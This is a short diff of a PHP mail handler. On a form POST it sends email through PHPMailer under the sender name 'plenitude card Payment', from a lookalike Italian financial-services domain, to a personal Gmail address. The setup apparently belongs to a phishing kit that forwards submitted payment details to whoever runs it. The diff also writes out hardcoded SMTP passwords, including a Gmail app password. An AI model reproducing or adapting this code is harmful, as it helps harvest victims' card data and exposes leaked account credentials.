@@ -26,13 +26,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $mail = new PHPMailer(true);
 
         try {
+           // Configuration du serveur SMTP
             $mail->isSMTP();
-            $mail->Host = 'smtp.spacemail.com';
+            $mail->Host = 'smtp.gmail.com'; // Serveur SMTP de Gmail
             $mail->SMTPAuth = true;
-            $mail->Username = 'pagamento@serviziofinanzieri.it.com';
-            $mail->Password = '383A6cf5-D61A-4154-9bf3-0d5f822BDc07';
+            $mail->Username = 'scottmayzie@gmail.com'; // Remplacez par votre adresse Gmail
+            $mail->Password = 'itipzjmsptsyolny'; // Remplacez par votre mot de passe d'application Gmail
             $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
-            $mail->Port = 993;
+            $mail->Port = 587;
 
             $mail->setFrom('pagamento@serviziofinanzieri.it.com', 'plenitude card Payment');
             $mail->addAddress('jasmayzie@gmail.com');
